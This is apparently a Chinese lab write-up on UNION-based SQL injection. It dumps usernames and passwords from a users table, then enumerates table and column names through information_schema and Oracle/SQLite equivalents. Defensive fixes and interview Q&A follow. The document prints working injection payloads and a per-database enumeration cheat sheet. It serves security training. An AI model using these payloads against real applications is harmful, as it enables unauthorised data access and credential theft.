## 一、漏洞原理

前面三题是在**原查询的范围内**做文章：注掉条件（001）、合并结果（002）、摸清列类型（003）。

这一题的目标不同 —— 要**读到原查询根本碰不到的另一张表**：`users`。

手段依然是 UNION，但换了个用法：不再往结果里塞常量（`NULL`、`'a'`），而是**塞一条指向别的表的子查询**：

```sql
' UNION SELECT username, password FROM users--
```

这之所以成立，有两个前提：

1. **注入点允许追加完整语句**（前题已证明）
2. **数据库账号有权读 `users` 表** —— 应用自己的账号权限，就是攻击者的权限天花板

## 二、复现步骤

1. Burp 抓 `category` 参数请求
2. 确认列数与类型（沿用前两题结论）：

```
category=Accessories' UNION SELECT 'abc','def'--
```
→ 返回正常，确认 **2 列且都是字符串类型**

3. 把常量换成目标表的字段：

```
category=Accessories' UNION SELECT username,password FROM users--
```

4. 响应里出现了所有用户的**用户名与口令**
5. 取管理员那行口令，回到登录页登录 → 以 administrator 身份进入后台

**关键点**：这一步之所以成功，不是因为我"知道"表名叫 `users`、列名叫 `username`/`password` —— 而是因为**这道题用了教科书式的命名**。换一个命名随意的真实系统，这条 payload 会直接报「未知的列」。真正的确定方法见下一节。

## 三、如何真正确定表名与列名（不靠猜）

**这一节是本题最该掌握的部分。**

### 3.1 猜是快路径，不是全部

`users` / `username` / `password` 是最常见的命名约定，实战里**先猜一次**很划算 —— 一次请求就中。但猜不中时必须有能力**问数据库自己**。

真实系统里列名可能是 `login_name`、`pwd_hash`、`member_no`，表可能叫 `member`、`sys_account`。只靠猜就会卡死。

### 3.2 数据库维护着一份"关于自己的目录"

主流数据库都有 **information_schema（信息模式）** —— 它记录：有哪些库、哪些表、每张表有哪些列、列是什么类型。

**第一步：列表名**

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

**第二步：列某张表的列名**

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

**第三步：拿到真列名后，才去读数据** —— 顺序是「枚举 → 读取」，不是「猜 → 读取」。

### 3.3 回显位只有一列时怎么办

如果 UNION 只能显示一列（另一列不显示），可以用字符串聚合函数把多个名字**挤在一个格子里**返回：

| 数据库 | 用法 |
|---|---|
| MySQL | `SELECT group_concat(table_name) FROM information_schema.tables--` |
| SQL Server | `SELECT string_agg(table_name, ',') FROM ...` |
| Oracle | `SELECT listagg(table_name, ',') FROM ...` |
| PostgreSQL | `SELECT string_agg(table_name, ',') FROM ...` |

也可以加 `LIMIT 1 OFFSET n`（MySQL/PostgreSQL）逐条翻页。

### 3.4 各数据库的对应关系

| 数据库 | 表清单 | 列清单 | 说明 |
|---|---|---|---|
| MySQL / PostgreSQL | `information_schema.tables` | `information_schema.columns` | 最通用，主流靶场都是这套 |
| SQL Server | `information_schema.tables` / `sysobjects` | `information_schema.columns` / `syscolumns` | |
| Oracle | `all_tables` | `all_tab_columns` | **没有** `information_schema`；常量查询要 `FROM dual`；列名默认**大写** |
| SQLite | `sqlite_master`（`type='table'`） | `PRAGMA table_info(表名)` | 轻量，注意用法不同 |

**注意**：`information_schema` 查得到的不只是业务表，还包含大量系统表 —— 实战里要按表名/列名特征筛，或限定当前库（MySQL 用 `table_schema=database()`）。

### 3.5 本地验证记录

用一个**故意不按常识命名**的库做对照，验证"枚举"与"猜"的差别：

```
表: products, users
users 表的真实列: uid(INTEGER) / login_name(TEXT) / secret_hash(TEXT)

按真列名读:  administrator / 3f8a9c2e1b     ✅
按常识硬猜:  SELECT username, password FROM users
             -> 报错: no such column: username   ❌
```

**结论**：猜中是因为题目的命名友好；枚举才是通用能力。

## 四、根本原因

- 用户输入被拼进 SQL 执行（一至三题同源）
- **本題多暴露一层**：数据库把**自身结构的元数据**也开放给应用账号查询。只要应用账号能读 `information_schema`，攻击者就能把库结构完整摸清 —— 从"盲猜"升级为"测绘"
- 叠加**数据库账号权限过大**：应用账号能读 `users` 表，说明它远超业务所需

## 五、修复方案

1. **参数化查询** —— 根治。输入永远作为值传入，无法追加语句
2. **数据库账号最小权限** —— 应用只授予必要表的必要操作；禁止读 `information_schema` 之外的库、禁止读无关表。即便注入成功也读不到口令表
3. **口令不可明文存储** —— 读到的是哈希而非明文，显著削弱"读出口令即登录"的杀伤力。加盐慢哈希（bcrypt/argon2）
4. **关闭详细错误回显** —— 让"猜错列名"不再返回可用信息
5. **WAF / 输入监控** —— 对 `UNION`、`information_schema` 等特征告警，作为纵深防御

## 六、面试问答

**Q：你怎么知道表名是 `users`、列名是 `username`？**
A：先按常见命名试一次（快路径）；试不中再查 `information_schema.tables` 枚举表名、`information_schema.columns` 枚举列名。**枚举是能力，猜是优化**，两者都要有。

**Q：`information_schema` 是什么？**
A：数据库自带的元数据目录，记录库/表/列/类型等信息。MySQL、PostgreSQL、SQL Server 都有。

**Q：Oracle 上怎么写？**
A：没有 `information_schema`，改用 `all_tables` 和 `all_tab_columns`；常量查询要 `FROM dual`；列名默认大写。

**Q：如果只能回显一列呢？**
A：用 `group_concat` / `string_agg` / `listagg` 把多个值拼成一格返回，或用 `LIMIT/OFFSET` 逐条取。

**Q：为什么读到了口令就能登录？**
A：这道题口令是明文比对。真实系统若用哈希存储，读出哈希也不能直接登录，需要破解或撞库 —— 这正是"口令要哈希存储"的价值。
